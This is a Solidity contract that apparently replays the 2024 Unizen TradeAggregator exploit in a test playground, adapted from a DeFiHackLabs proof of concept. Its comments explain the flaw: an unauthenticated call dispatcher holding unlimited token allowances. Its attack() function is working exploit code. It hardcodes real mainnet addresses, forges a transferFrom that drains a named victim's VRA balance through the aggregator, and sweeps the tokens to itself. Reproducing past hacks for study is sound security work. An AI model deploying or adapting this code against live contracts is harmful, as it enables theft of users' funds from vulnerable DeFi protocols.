// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-03-UnizenIO2).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (ContractTest.testExploit crafts the payload and calls TradeAggregator.swap
// directly with `address(this)` as the recipient) — there is no standalone
// exploit contract to deploy. This is a faithful, self-contained copy of that
// inline attack so the playground can deploy it and record attack().
// Logic and constants are copied verbatim from
// test/UnizenIO2_exp.sol::ContractTest.testExploit.
//
// Root cause: TradeAggregator.swap(Info, Call[]) is an unauthenticated generic
// call dispatcher. It executes attacker-supplied calls[].target.call(data) with
// no check that the call debits the caller's own funds, then sweeps whatever
// info.token balance the aggregator now holds to info.to. Because the
// aggregator held type(uint256).max ERC-20 allowances from many users (as a
// DEX router necessity), an attacker can hand it a forged
// `VRA.transferFrom(victim, aggregator, victim.balance)` call and have the
// aggregator relay it (aggregator is msg.sender of the inner call, so the
// victim's allowance is honored), then have it sweep the pulled tokens back
// to the attacker via the unconditional post-call sweep.

interface ITradeAggregator {
    struct Info {
        address to;
        uint256 structMember2;
        address token;
        uint256 structMember3;
        uint256 structMember4;
        uint256 structMember5;
        string uuid;
        uint256 apiId;
        uint256 userPSFee;
    }

    struct Call {
        address target;
        uint256 amount;
        bytes data;
    }
}

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
}

contract UnizenIO2Drain {
    ITradeAggregator private constant TRADE_AGGREGATOR =
        ITradeAggregator(0xd3f64BAa732061F8B3626ee44bab354f854877AC);
    IERC20 private constant VRA = IERC20(0xF411903cbC70a74d22900a5DE66A2dda66507255);
    address private constant TOKEN_HOLDER = 0x12fe4bC7D0B969055F763C5587F2ED0cA1b334f3;

    // Accept the 1-wei top-up sent by setup (mirrors the Foundry test
    // contract's default ETH balance — the original test's `address(this)`
    // needs no receive() since it's the outer EOA-like caller, but this
    // standalone contract must be able to hold the wei it forwards below).
    receive() external payable {}

    // step 0: craft the forged payload and call the vulnerable dispatcher.
    function attack() external payable {
        // step 1: build Info with `to` = this contract (the profit receiver)
        // and `token` = VRA (the asset being stolen).
        ITradeAggregator.Info memory info = ITradeAggregator.Info({
            to: address(this),
            structMember2: 0,
            token: address(VRA),
            structMember3: 1,
            structMember4: 0,
            structMember5: 186_783_104_413_296_096,
            uuid: "UNIZEN-CLI",
            apiId: 17,
            userPSFee: 1875
        });

        // step 2: forge a Call that makes the aggregator pull the victim's
        // entire VRA balance onto itself, using the aggregator's own
        // (attacker-uncontrolled) type(uint256).max allowance from the
        // victim.
        bytes memory callData = abi.encodeWithSignature(
            "transferFrom(address,address,uint256)",
            TOKEN_HOLDER,
            address(TRADE_AGGREGATOR),
            VRA.balanceOf(TOKEN_HOLDER)
        );

        ITradeAggregator.Call memory call =
            ITradeAggregator.Call({target: address(VRA), amount: 0, data: callData});

        ITradeAggregator.Call[] memory calls = new ITradeAggregator.Call[](1);
        calls[0] = call;

        bytes memory data = abi.encodeWithSelector(bytes4(0x1ef29a02), info, calls);

        // step 3: the vulnerable dispatcher call — swap() executes calls[]
        // with no ownership check, then unconditionally sweeps the newly
        // arrived info.token to info.to (this contract).
        (bool success,) = address(TRADE_AGGREGATOR).call{value: 1 wei}(data);
        require(success, "Call to TradeAggregator not successful");
    }
}
